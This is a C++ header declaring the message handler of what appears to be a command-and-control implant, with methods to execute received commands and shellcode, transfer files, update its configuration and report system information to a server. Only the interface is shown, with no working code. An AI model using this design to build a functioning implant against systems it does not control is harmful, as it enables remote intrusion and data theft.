/* 
 * MessageHandler.h 
 *
 * Purpose: Responsible for handling internal messages (InternalMessage)
 *
 *
 *
 */

/*  (OWNS execution components) */

#ifndef MESSAGE_HANDLER_H
#define MESSAGE_HANDLER_H

#include "C2Profile.h"
#include "MessageTypes.h"
#include "TransportLayer.h"

#include <string>
#include <vector>
#include <cstdint>
// #include <memory> // included by C2Profile


class TransportLayer;


// TODO: buffer overflow in messagehandler... which is bleeding into transportlayer variable stored in messagehandler?
class MessageHandler
{
public:
	//MessageHandler(C2Profile& config) {}; // TODO:
	//MessageHandler() : transportLayer_(nullptr) {}
	MessageHandler();
	~MessageHandler();

    
    bool sendMessage(); // overload this function?
    bool recvMessage(); // overload this function?

	//bool receiveMessages(uint8_t* buffer, size_t bytes_received);

	bool executeCommand(std::vector<uint8_t>& data);
	//bool executeShellcode(std::vector<uint8_t>& data);
	bool executeShellcode(InternalMessage& msg);

	bool downloadFile(std::vector<uint8_t>& data);
	//bool executeFile();
	bool uploadFile(std::vector<uint8_t>& data);
	bool updateConfig(std::vector<uint8_t>& data);
	bool handleServerError(std::vector<uint8_t>& data);
	bool systemInfo(InternalMessage& msg);

	// Processes an InternalMessage and use the messageHandler_ based on the InternalMessage's messageType
	void processMessage(InternalMessage& msg);


	// Iterate through all messages in the queue and send to the server
	void sendQueuedMessages();

	void setTransportLayer(TransportLayer& transportLayer);


	//bool handleTCP(uint8_t* rawData, size_t rawDataLength, InternalMessage* resultMsg);
private:
	std::vector<uint8_t> string2byte(std::string& inMsg);
	std::string byte2string(std::vector<uint8_t>& inMsg);

	//C2Profile& config_;
	// Connections connection_ // MessageHandler should own/control socket/connections?

	//std::queue<InternalMessage> outgoing_queue;
	//std::mutex queue_mutex; // TODO: add thread logic too?

	// TODO: MessageHandler should have references to all transporters? 
	// std::vector<Transporter*> transporters_;
	TransportLayer* transportLayer_; // NOTE: pointer is being used instead of a reference because references require immediate initialization


};


typedef std::unique_ptr<MessageHandler> MessageHandlerPtr;

#endif
